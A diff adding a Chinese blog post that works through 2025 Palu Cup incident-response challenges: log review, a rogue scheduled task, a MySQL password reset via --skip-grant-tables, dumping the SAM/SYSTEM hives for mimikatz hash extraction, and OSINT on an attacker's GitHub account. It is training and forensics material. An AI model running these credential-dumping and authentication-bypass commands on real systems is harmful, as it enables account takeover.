@@ -1,0 +1,3082 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="帕鲁杯应急复现 畸形的爱 上次做了6题，现在接着做\n暴力破解开始时间 由于前面那个有docker环境，我们查看docker启动的服务\n1 docker ps 发现phpmyadmin，这个最有可能被暴力破解\n">
+<title>2025帕鲁杯应急复现</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="2025帕鲁杯应急复现">
+<meta property='og:description' content="帕鲁杯应急复现 畸形的爱 上次做了6题，现在接着做\n暴力破解开始时间 由于前面那个有docker环境，我们查看docker启动的服务\n1 docker ps 发现phpmyadmin，这个最有可能被暴力破解\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='应急响应' /><meta property='article:published_time' content='2025-05-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-05-26T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/1.jpg' />
+<meta name="twitter:title" content="2025帕鲁杯应急复现">
+<meta name="twitter:description" content="帕鲁杯应急复现 畸形的爱 上次做了6题，现在接着做\n暴力破解开始时间 由于前面那个有docker环境，我们查看docker启动的服务\n1 docker ps 发现phpmyadmin，这个最有可能被暴力破解\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/1.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#畸形的爱">畸形的爱</a>
+      <ol>
+        <li><a href="#暴力破解开始时间">暴力破解开始时间</a></li>
+        <li><a href="#flag2">flag2</a></li>
+        <li><a href="#flag3">flag3</a></li>
+        <li><a href="#攻击者开放端口3个">攻击者开放端口3个</a></li>
+        <li><a href="#隐藏账户的密码">隐藏账户的密码</a></li>
+        <li><a href="#溯源flag4">[溯源]flag4</a></li>
+        <li><a href="#溯源攻击者的邮箱">[溯源]攻击者的邮箱</a></li>
+      </ol>
+    </li>
+    <li><a href="#应急主线">应急主线</a>
+      <ol>
+        <li><a href="#solar_linux后门排查">solar_Linux后门排查</a></li>
+        <li><a href="#应急响应2-1">应急响应2-1</a></li>
+        <li><a href="#应急响应2-2">应急响应2-2</a></li>
+        <li><a href="#应急响应2-3">应急响应2-3</a></li>
+        <li><a href="#应急响应2-4">应急响应2-4</a></li>
+        <li><a href="#应急响应2-5">应急响应2-5</a></li>
+        <li><a href="#应急响应2-6">应急响应2-6</a></li>
+        <li><a href="#应急响应2-7">应急响应2-7</a></li>
+        <li><a href="#应急响应2-8">应急响应2-8</a></li>
+        <li><a href="#应急响应2-9">应急响应2-9</a></li>
+        <li><a href="#应急响应2-10">应急响应2-10</a></li>
+        <li><a href="#应急响应2-11">应急响应2-11</a></li>
+        <li><a href="#应急响应2-12">应急响应2-12</a></li>
+        <li><a href="#应急响应2-13">应急响应2-13</a></li>
+        <li><a href="#应急响应2-14">应急响应2-14</a></li>
+        <li><a href="#应急响应2-15">应急响应2-15</a></li>
+        <li><a href="#应急响应2-16">应急响应2-16</a></li>
+        <li><a href="#应急响应2-17">应急响应2-17</a></li>
+        <li><a href="#应急响应2-18">应急响应2-18</a></li>
+        <li><a href="#应急响应2-19">应急响应2-19</a></li>
+        <li><a href="#应急响应2-20">应急响应2-20</a></li>
+        <li><a href="#应急响应2-21">应急响应2-21</a></li>
+        <li><a href="#应急响应2-22">应急响应2-22</a></li>
+        <li><a href="#应急响应2-23">应急响应2-23</a></li>
+        <li><a href="#应急响应2-24">应急响应2-24</a></li>
+        <li><a href="#应急响应2-25">应急响应2-25</a></li>
+        <li><a href="#应急响应2-26">应急响应2-26</a></li>
+        <li><a href="#应急响应2-27">应急响应2-27</a></li>
+        <li><a href="#应急响应2-28">应急响应2-28</a></li>
+        <li><a href="#应急响应2-29">应急响应2-29</a></li>
+        <li><a href="#应急响应2-30">应急响应2-30</a></li>
+        <li><a href="#应急响应2-31">应急响应2-31</a></li>
+        <li><a href="#应急响应2-32">应急响应2-32</a></li>
+        <li><a href="#应急响应2-33">应急响应2-33</a></li>
+        <li><a href="#应急响应2-34">应急响应2-34</a></li>
+        <li><a href="#应急响应2-35">应急响应2-35</a></li>
+        <li><a href="#应急响应2-36">应急响应2-36</a></li>
+        <li><a href="#应急响应2-37">应急响应2-37</a></li>
+        <li><a href="#应急响应2-38">应急响应2-38</a></li>
+        <li><a href="#应急响应2-39">应急响应2-39</a></li>
+        <li><a href="#应急响应2-40">应急响应2-40</a></li>
+        <li><a href="#应急响应2-41">应急响应2-41</a></li>
+        <li><a href="#应急响应2-42">应急响应2-42</a></li>
+        <li><a href="#应急响应2-43">应急响应2-43</a></li>
+        <li><a href="#应急响应2-44">应急响应2-44</a></li>
+        <li><a href="#应急响应2-45">应急响应2-45</a></li>
+        <li><a href="#应急响应2-46">应急响应2-46</a></li>
+        <li><a href="#应急响应2-47">应急响应2-47</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/">
+                <img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/1.jpg"
+                        
+                        width="4096" 
+                        height="2304" 
+                        loading="lazy"
+                        alt="Featured image of post 2025帕鲁杯应急复现" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/wp/" style="background-color: #2a9d8f; color: #fff;">
+                Wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/">2025帕鲁杯应急复现</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 26, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 12 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="帕鲁杯应急复现">帕鲁杯应急复现
+</h1><h2 id="畸形的爱">畸形的爱
+</h2><p>上次做了6题，现在接着做</p>
+<h3 id="暴力破解开始时间">暴力破解开始时间
+</h3><p>由于前面那个有docker环境，我们查看docker启动的服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker ps
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现phpmyadmin，这个最有可能被暴力破解</p>
+<p>查看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker logs phpmyadmin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250526193941574.png"
+	width="1555"
+	height="740"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250526193941574_hu1997993382407534753.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250526193941574_hu9717932891755258497.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250526193941574"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="504px"
+	
+></p>
+<p>所以flag是</p>
+<p>palu{2025:03:05:58}</p>
+<h3 id="flag2">flag2
+</h3><p>在flag1文件的最后有一串命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> &lt;Actions Context=&#34;Author&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;Exec&gt;
+</span></span><span class="line"><span class="cl">      &lt;Command&gt;&#34;C:\Program Files (x86)\Microsoft\a.bat&#34;&lt;/Command&gt;
+</span></span><span class="line"><span class="cl">    &lt;/Exec&gt;
+</span></span><span class="line"><span class="cl">  &lt;/Actions&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看a.bat</p>
+<p>把他改成txt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@echo off
+</span></span><span class="line"><span class="cl">msg * &#34;王美欣，你知道我有多爱你吗&#34;
+</span></span><span class="line"><span class="cl">echo flag2palu{nizhidaowoyouduoainima}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="flag3">flag3
+</h3><p>sql这台机子root账号密码就是sql</p>
+<p>进root后</p>
+<p>用mysql连接数据库,byd密码不对</p>
+<p>先无密码启动mysql</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo mysqld_safe --skip-grant-tables --skip-networking &amp;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">UPDATE mysql.user SET authentication_string=PASSWORD(&#39;root&#39;) WHERE User=&#39;root&#39;;
+</span></span><span class="line"><span class="cl">FLUSH PRIVILEGES;
+</span></span><span class="line"><span class="cl">EXIT;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql -uroot -p
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">show databases;
+</span></span><span class="line"><span class="cl">show tables;
+</span></span><span class="line"><span class="cl">select * from orders;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到一串base64，然后解码得到flag</p>
+<h3 id="攻击者开放端口3个">攻击者开放端口3个
+</h3><p>第一个就是之前查看那个ip2的时候找到的</p>
+<p>clean.sh里面开放了1133端口</p>
+<p>接下来我们查看定时任务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">crontab -l
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现tmp目录下有个r.sh</p>
+<p>查看</p>
+<p>发现反弹shell命令，开放1144端口</p>
+<p>接下来z在那台win10用netstat查看开放端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netstat
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="隐藏账户的密码">隐藏账户的密码
+</h3><p>可以直接传d盾到那台win10上面扫，能扫到后门用户</p>
+<p>win10还可以用命令查看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net user
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是只看到前面的两个正常账号</p>
+<p>用powershell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Get-LocalUser
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现了后门用户</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250526200842480.png"
+	width="874"
+	height="206"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250526200842480_hu7087297970256275534.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250526200842480_hu9719731083576495393.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250526200842480"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="424"
+		data-flex-basis="1018px"
+	
+></p>
+<p>system$</p>
+<p>然后用mimikatz跑hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg save hklm\sam sam.save
+</span></span><span class="line"><span class="cl">reg save hklm\system system.save
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后在 mimikatz 中执行:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">Isadump::sam /sam:sam.save /system:system.save
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后去MD5解密</p>
+<h3 id="溯源flag4">[溯源]flag4
+</h3><p>把那个钓鱼的exe拖到ida里面分析，发现黑客的id：n0k4u</p>
+<p>去github上找，他的项目里面有一个qq号</p>
+<p>搜索得到flag</p>
+<h3 id="溯源攻击者的邮箱">[溯源]攻击者的邮箱
+</h3><p>因为知道id就可以知道邮箱</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://api.github.com/users/&lt;name&gt;/events/public
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://api.github.com/users/n0k4u/events/public
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到邮箱</p>
+<h2 id="应急主线">应急主线
+</h2><h3 id="solar_linux后门排查">solar_Linux后门排查
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">题目描述
+</span></span><span class="line"><span class="cl">跳板机疑似被遗留后门,请排查
+</span></span><span class="line"><span class="cl">1、找到可疑进程完整路径
+</span></span><span class="line"><span class="cl">2、找到被横向的服务器IP
+</span></span><span class="line"><span class="cl">3、连接被横向服务器
+</span></span><span class="line"><span class="cl">flag格式为 flag{base64{完整路径}|服务器IP|服务器中flag文本}
+</span></span><span class="line"><span class="cl">root:Solar@2025_05_palu!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ss -anptu
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ss看到恶意ip,看到pid为11</p>
+<p>ip为<code>49.232.112.164:22</code></p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528202511884.png"
+	width="1636"
+	height="290"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528202511884_hu16600190227173079657.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250528202511884_hu4262850279895021168.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250528202511884"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="564"
+		data-flex-basis="1353px"
+	
+></p>
+<p>查看进程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ps -aux |grep 11
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>完整路径为<code>usr/lib/systemd/systemd-login</code></p>
